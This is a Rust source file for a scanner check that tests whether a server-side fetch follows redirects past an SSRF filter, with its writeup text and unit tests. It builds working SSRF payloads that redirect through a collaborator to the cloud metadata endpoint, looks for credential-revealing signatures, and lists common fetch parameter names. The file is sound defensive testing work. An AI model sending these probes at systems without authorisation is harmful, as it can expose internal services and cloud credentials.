//! `ssrf.redirect` — does a server-side fetch follow a redirect off the host it was aimed
//! at, so an open redirect carries it somewhere its filter would have refused?
//!
//! The common SSRF defence checks the URL it was handed — is the host internal? is it on
//! the allowlist? — and then fetches it. The common bypass is that the check runs once, on
//! the *first* URL, and the fetcher then follows a `302` to wherever it points. Hand it an
//! allowed URL that redirects inward and the filter never sees the real destination.
//!
//! ```text
//! url=http://169.254.169.254/…                     → refused: the filter sees an internal host
//! url=http://<collaborator>/<token>?to=http://169.254.169.254/…
//!                                                   → fetched (external, allowed), 302 followed,
//!                                                     metadata comes back ← the redirect walked past the filter
//! ```
//!
//! This settles its own suspicion ([`SETTLES`]), raised on inputs whose *name* is one a
//! server fetches (`url`, `uri`, `dest`, `next`, …) — `input.ssrf` already probes every
//! input for direct SSRF; this one asks the narrower, redirect-shaped question on the
//! inputs where it is worth the extra requests.
//!
//! # Two proofs, strongest first
//!
//! 1. **Reflected, to the internal target.** Point the input at a collaborator URL that
//!    `302`s to the cloud metadata service. If the metadata index comes back in the
//!    response, the fetch followed the redirect *all the way to an internal address* — the
//!    bypass, demonstrated end to end.
//! 2. **Blind, the follow itself.** Where nothing reflects, point the collaborator's
//!    redirect at a second collaborator path and watch for a callback to *it*. A hit on the
//!    redirected-to URL is the fetch following a redirect off-host, which is the whole
//!    primitive — it means any open redirect on a host the filter allows chains to SSRF.
//!
//! # Needs a collaborator
//!
//! The redirect hop is served by the run's out-of-band collaborator ([`Lab::canary`]).
//! Without one, there is nothing to redirect from, so the result is
//! [`Verification::Inconclusive`] — never a guess that the fetch is safe.

use async_trait::async_trait;
use nullhawk_types::finding::{
    Evidence, FindingSource, Hypothesis, Location, MessagePart, Severity,
};
use nullhawk_types::ids::InteractionId;
use nullhawk_types::inject::{inputs_in, substitute};
use nullhawk_types::object::ObjectLocation;
use nullhawk_types::verify::{
    DetectorId, DetectorInfo, DetectorMode, Support, Verification, Writeup,
};
use nullhawk_types::Result;
use nullhawk_verify::Lab;

use crate::{ActiveCheck, Budget, Subject};

/// The check.
pub struct SsrfRedirect;

/// The hypothesis this check raises and settles itself. Distinct from `input.ssrf`'s, so
/// both run — one tests the direct fetch, this one tests what a redirect does to it.
const SETTLES: &str = "ssrf.redirectable";

const INFO: DetectorInfo = DetectorInfo {
    id: DetectorId("ssrf.redirect"),
    name: "SSRF via open redirect",
    version: "1.0.0",
    about: "whether a server-side fetch follows a redirect off-host, so an open redirect carries it past the filter — proven to the cloud metadata endpoint or by an out-of-band callback",
    mode: DetectorMode::Active,
    observes: false,
    hypothesizes: true,
    settles: Some(SETTLES),
    intrusiveness: nullhawk_types::verify::Intrusiveness::Moderate,
};

/// The internal target the reflected probe redirects to — off-limits from the internet, so
/// its contents coming back prove the fetch reached inside.
const METADATA_URL: &str = "http://169.254.169.254/latest/meta-data/";

/// Tokens the EC2 metadata index lists that an ordinary page does not.
const SIGNATURES: &[&str] = &[
    "ami-id",
    "instance-id",
    "instance-type",
    "block-device-mapping",
    "reservation-id",
    "security-credentials",
    "public-ipv4",
    "local-ipv4",
];

/// Parameter names a server commonly fetches. The redirect probe is worth its extra
/// requests on these; `input.ssrf` covers the rest for direct SSRF.
const SINK_NAMES: &[&str] = &[
    "url",
    "uri",
    "link",
    "src",
    "href",
    "dest",
    "destination",
    "redirect",
    "redir",
    "return",
    "returnto",
    "returnurl",
    "next",
    "continue",
    "callback",
    "feed",
    "host",
    "target",
    "fetch",
    "proxy",
    "image",
    "imageurl",
    "domain",
];

/// A marker in the blind redirect target, so a callback to the redirected-to URL can be
/// told from the callback to the first one.
const FOLLOW_MARKER: &str = "nhfollowed";

/// How many times, and how often, to poll for a callback before calling it absent. A
/// later, slower callback is still possible — "nothing yet" is not "nothing ever".
const CALLBACK_POLLS: usize = 6;
const CALLBACK_INTERVAL: std::time::Duration = std::time::Duration::from_millis(750);

#[async_trait]
impl ActiveCheck for SsrfRedirect {
    fn about(&self) -> DetectorInfo {
        INFO
    }

    fn handles(&self, hypothesis: &Hypothesis) -> bool {
        hypothesis.detector == SETTLES
    }

    async fn settle(
        &self,
        subject: &Subject,
        lab: &dyn Lab,
        _budget: &Budget,
    ) -> Result<Verification> {
        let Some(slot) = slot_named(subject) else {
            return Ok(Verification::Inconclusive {
                why: format!(
                    "the input this was raised about is no longer in {} {}",
                    subject.exchange.method, subject.exchange.url
                ),
            });
        };
        let Some(canary) = lab.canary() else {
            return Ok(Verification::Inconclusive {
                why: format!(
                    "testing whether {} follows a redirect needs an out-of-band collaborator \
                     to redirect from — pass --collaborator. input.ssrf still covers direct \
                     SSRF without one",
                    describe(&slot),
                ),
            });
        };

        // Proof 1: redirect to the internal metadata endpoint. If its contents come back,
        // the fetch followed the redirect all the way inside.
        let to_metadata = format!("{}?to={}", canary.url, METADATA_URL);
        let probe = match send(subject, lab, &slot, &to_metadata).await {
            Attempt::Answered(answer) => answer,
            Attempt::Failed(why) => return Ok(Verification::Inconclusive { why }),
        };
        if let Some(signature) = first_signature(&probe.body) {
            return Ok(Verification::Supported {
                support: Support::Distinctive,
                note: format!(
                    "{} was set to a collaborator URL that redirects to the cloud metadata \
                     service, and the response came back carrying `{signature}` — the fetch \
                     followed the 302 to {METADATA_URL}, an internal address. A redirect \
                     carried the server-side request past whatever filter refuses that host \
                     directly",
                    describe(&slot),
                ),
                evidence: vec![
                    from_exchange(subject),
                    Evidence::Exchange {
                        request: probe.request,
                        response: None,
                        note: format!("{} set to {to_metadata}", describe(&slot)),
                    },
                ],
            });
        }

        // Proof 2: redirect to a second, marked collaborator path, and watch for a callback
        // to *it*. A hit on the redirected-to URL is the follow itself, observed blind.
        let follow_target = format!("{}/{FOLLOW_MARKER}", canary.url);
        let to_collaborator = format!("{}?to={}", canary.url, follow_target);
        let blind = match send(subject, lab, &slot, &to_collaborator).await {
            Attempt::Answered(answer) => answer.request,
            Attempt::Failed(why) => return Ok(Verification::Inconclusive { why }),
        };

        let interactions = poll(lab, &canary.token).await;
        // The marker must be in the request *path*, not the query. The first callback's
        // path is `/<token>?to=…/nhfollowed`, which carries the marker in its query string
        // without the redirect having been followed — only a callback to `/<token>/nhfollowed`
        // is the follow itself.
        let followed = interactions
            .iter()
            .find(|hit| is_follow_callback(&hit.path));
        if let Some(hit) = followed {
            return Ok(Verification::Reproduced {
                note: format!(
                    "{} was set to a collaborator URL that redirects to a second collaborator \
                     path, and a {} callback reached that second path — the server-side fetch \
                     follows a redirect off the host it was aimed at. Any open redirect on a \
                     host its filter allows chains to a full server-side request forgery; the \
                     response revealed nothing, so this is proven by the callback",
                    describe(&slot),
                    hit.protocol,
                ),
                evidence: vec![
                    from_exchange(subject),
                    Evidence::Exchange {
                        request: blind,
                        response: None,
                        note: format!("{} set to {to_collaborator}", describe(&slot)),
                    },
                    Evidence::OutOfBand {
                        request: blind,
                        interaction: InteractionId::new(),
                        protocol: hit.protocol.clone(),
                    },
                ],
            });
        }

        if interactions.is_empty() {
            return Ok(Verification::Refuted {
                note: format!(
                    "no callback reached the collaborator from {}, so this input did not make \
                     the server fetch the URL it was given — there is no redirect to follow. \
                     Direct SSRF, if any, is input.ssrf's to settle",
                    describe(&slot),
                ),
            });
        }
        Ok(Verification::Refuted {
            note: format!(
                "{} made the server fetch the collaborator, but no callback reached the \
                 redirected-to path — the fetch does not follow the 302 it was served, so a \
                 redirect cannot carry it past a host filter",
                describe(&slot),
            ),
        })
    }

    fn writeup(&self, subject: &Subject, verification: &Verification) -> Writeup {
        let slot = slot_named(subject);
        Writeup {
            target: subject.target,
            title: format!(
                "A server-side fetch in {} {} follows redirects off-host",
                subject.exchange.method,
                path_of(&subject.exchange.url),
            ),
            description: format!(
                "{} makes the server fetch a URL it is given, and that fetch follows an HTTP \
                 redirect to a host other than the one it was pointed at. {}\n\nThe redirect \
                 hop was served by the run's own out-of-band collaborator, so nothing was \
                 asked of a third party.",
                describe_opt(&slot),
                verification.note(),
            ),
            impact: "An SSRF filter that checks only the URL it is handed is bypassed: an \
                     attacker supplies an allowed URL — or the application's own open \
                     redirect — that redirects inward, and the server follows it to \
                     internal services, cloud metadata and credentials among them. This \
                     turns a filtered, seemingly-safe fetch into a full server-side request \
                     forgery."
                .into(),
            remediation: "Re-apply the destination check on every hop, not just the first \
                          URL: disable redirect-following on the fetch, or re-validate the \
                          Location of each 3xx against the allowlist before following it. \
                          Resolve and pin the host, and refuse any redirect that leaves the \
                          allowed set. Fixing the open redirect that supplies the hop helps \
                          but is not sufficient — the fetch following redirects is the root."
                .into(),
            reproduction: format!(
                "Point {} at `http://<collaborator>/<token>?to={METADATA_URL}` and read the \
                 response, then at `http://<collaborator>/<token>?to=http://<collaborator>/\
                 <token>/{FOLLOW_MARKER}` and check the collaborator for a callback to the \
                 {FOLLOW_MARKER} path. `nullhawk poc <project> <finding>` compiles the exact \
                 requests; run the collaborator with `nullhawk oob serve`.",
                describe_opt(&slot),
            ),
            cwe: Some("CWE-918".into()),
            owasp: Some("A10:2021 Server-Side Request Forgery".into()),
            source: FindingSource::ActiveScan {
                detector: INFO.id.to_string(),
                version: INFO.version.to_string(),
            },
            severity: severity_for(verification),
            location: slot
                .as_ref()
                .map(|slot| Location {
                    part: part_of(slot),
                    name: name_of(slot),
                })
                .or_else(|| subject.hypothesis.location.clone()),
        }
    }
}

/// One probe and what came back.
struct Answer {
    request: nullhawk_types::ids::RequestId,
    body: Vec<u8>,
}

enum Attempt {
    Answered(Answer),
    Failed(String),
}

/// Places a value in one input and sends the request.
async fn send(subject: &Subject, lab: &dyn Lab, slot: &ObjectLocation, value: &str) -> Attempt {
    let mut draft = subject.draft.clone();
    draft.request = match substitute(&draft.request, slot, value) {
        Ok(request) => request,
        Err(e) => return Attempt::Failed(format!("the payload could not be placed: {e}")),
    };
    match lab.experiment(&draft, None).await {
        Ok(sent) => Attempt::Answered(Answer {
            request: sent.id,
            body: sent.exchange.response.body.to_vec(),
        }),
        Err(e) => Attempt::Failed(e.to_string()),
    }
}

/// Polls the collaborator across the callback window, accumulating what arrives (each poll
/// drains only what is new, so the accumulation is the whole window).
async fn poll(lab: &dyn Lab, token: &str) -> Vec<nullhawk_oob::Interaction> {
    let mut all = Vec::new();
    for _ in 0..CALLBACK_POLLS {
        tokio::time::sleep(CALLBACK_INTERVAL).await;
        if let Ok(mut hits) = lab.interactions(token).await {
            all.append(&mut hits);
        }
    }
    all
}

/// Whether a collaborator callback is the *followed* redirect, not the first hop. The
/// marker must appear in the path, because the first callback carries the redirect target
/// — including the marker — in its query string.
fn is_follow_callback(path: &str) -> bool {
    path.split('?').next().unwrap_or("").contains(FOLLOW_MARKER)
}

fn first_signature(body: &[u8]) -> Option<String> {
    let text = String::from_utf8_lossy(body);
    SIGNATURES
        .iter()
        .find(|needle| text.contains(**needle))
        .map(|needle| needle.to_string())
}

fn from_exchange(subject: &Subject) -> Evidence {
    Evidence::Exchange {
        request: subject.exchange.id,
        response: None,
        note: format!(
            "the captured exchange this was raised from: {} {}",
            subject.exchange.method, subject.exchange.url
        ),
    }
}

/// Severity: a redirect-driven SSRF, reflected or blind, is the serious class SSRF is.
fn severity_for(verification: &Verification) -> Severity {
    match verification {
        Verification::Reproduced { .. } => Severity::High,
        Verification::Supported {
            support: Support::Distinctive,
            ..
        } => Severity::High,
        Verification::Supported { .. } => Severity::Medium,
        _ => Severity::Low,
    }
}

fn slot_named(subject: &Subject) -> Option<ObjectLocation> {
    let wanted = subject.hypothesis.location.as_ref()?;
    inputs_in(&subject.draft.request.path, &subject.draft.request.headers)
        .into_iter()
        .find(|slot| {
            name_of(slot).eq_ignore_ascii_case(&wanted.name) && part_of(slot) == wanted.part
        })
}

fn describe(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } => format!("the `{name}` query parameter"),
        ObjectLocation::Header { name, .. } => format!("the `{name}` header"),
        other => format!("{other:?}"),
    }
}

fn describe_opt(slot: &Option<ObjectLocation>) -> String {
    slot.as_ref()
        .map(describe)
        .unwrap_or_else(|| "an input".into())
}

fn name_of(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } | ObjectLocation::Header { name, .. } => name.clone(),
        other => format!("{other:?}"),
    }
}

fn part_of(slot: &ObjectLocation) -> MessagePart {
    match slot {
        ObjectLocation::Query { .. } => MessagePart::Query,
        ObjectLocation::Header { .. } => MessagePart::Header,
        _ => MessagePart::Body,
    }
}

fn path_of(url: &str) -> &str {
    url.split_once("://")
        .and_then(|(_, rest)| rest.find('/').map(|at| &rest[at..]))
        .unwrap_or("/")
}

/// Raises one suspicion per sink-named input.
///
/// Narrowed to names a server fetches, because the redirect probe costs two extra requests
/// per input and `input.ssrf` already probes every input for the direct case. A URL-valued
/// parameter with an unusual name is a stated gap rather than a hidden one.
pub fn suspect(exchange: &nullhawk_scan::Exchange) -> Vec<Hypothesis> {
    inputs_in(&exchange.path, &exchange.request_headers)
        .into_iter()
        .filter(|slot| {
            let name = name_of(slot).to_ascii_lowercase();
            SINK_NAMES.iter().any(|sink| name == *sink)
        })
        .map(|slot| Hypothesis {
            detector: SETTLES.to_string(),
            claim: format!(
                "{} {} — whether {} follows a redirect off-host needs a request",
                exchange.method,
                path_of(&exchange.url),
                describe(&slot),
            ),
            source_request: exchange.id,
            location: Some(Location {
                part: part_of(&slot),
                name: name_of(&slot),
            }),
            provisional_severity: Severity::Info,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn query(url: &str) -> nullhawk_scan::Exchange {
        let path = url
            .split_once("://")
            .and_then(|(_, rest)| rest.find('/').map(|at| rest[at..].to_string()))
            .unwrap_or_else(|| "/".into());
        nullhawk_scan::Exchange {
            id: nullhawk_types::ids::RequestId::new(),
            target: nullhawk_types::ids::TargetId::new(),
            host: "app.example.com".into(),
            port: 443,
            secure: true,
            method: "GET".into(),
            url: url.into(),
            path,
            status: 200,
            request_headers: nullhawk_types::http::Headers::new(),
            response_headers: nullhawk_types::http::Headers::new(),
            response_bytes: 10,
            authenticated: false,
            tls: None,
            sent_at: "2026-10-01T00:00:00Z".into(),
            origin: "proxy".into(),
        }
    }

    #[test]
    fn it_raises_and_settles_its_own_suspicion() {
        let info = SsrfRedirect.about();
        assert_eq!(info.mode, DetectorMode::Active);
        assert!(info.sends());
        assert!(info.hypothesizes);
        assert_eq!(info.settles, Some(SETTLES));
        let raised = suspect(&query("https://app.example.com/fetch?url=http://x/"));
        assert_eq!(raised.len(), 1);
        assert!(SsrfRedirect.handles(&raised[0]));
    }

    #[test]
    fn only_a_sink_named_input_raises_a_suspicion() {
        // The narrowing: input.ssrf probes every input; this one only the fetch-shaped names.
        assert_eq!(suspect(&query("https://app.example.com/f?url=x")).len(), 1);
        assert_eq!(suspect(&query("https://app.example.com/f?dest=x")).len(), 1);
        assert!(suspect(&query("https://app.example.com/search?q=x")).is_empty());
        assert!(suspect(&query("https://app.example.com/f?page=2")).is_empty());
    }

    #[test]
    fn the_metadata_index_is_recognised_but_prose_is_not() {
        let index = b"ami-id\nami-launch-index\ninstance-id\niam/\nsecurity-credentials\n";
        assert_eq!(first_signature(index).as_deref(), Some("ami-id"));
        assert!(first_signature(b"<html>our instance of the service</html>").is_none());
    }

    #[test]
    fn a_distinctive_or_reproduced_finding_is_high() {
        let reflected = Verification::Supported {
            support: Support::Distinctive,
            note: String::new(),
            evidence: Vec::new(),
        };
        assert_eq!(severity_for(&reflected), Severity::High);
        let blind = Verification::Reproduced {
            note: String::new(),
            evidence: Vec::new(),
        };
        assert_eq!(severity_for(&blind), Severity::High);
    }

    #[test]
    fn only_the_marker_in_the_path_is_the_followed_redirect() {
        // The bug live-fire caught: the first callback carries the redirect target — marker
        // and all — in its query, so a substring match on the whole path false-positives.
        // Only the marker in the path means the redirect was actually followed.
        assert!(is_follow_callback(&format!("/tok/{FOLLOW_MARKER}")));
        assert!(!is_follow_callback(&format!(
            "/tok?to=http://c/tok/{FOLLOW_MARKER}"
        )));
    }
}
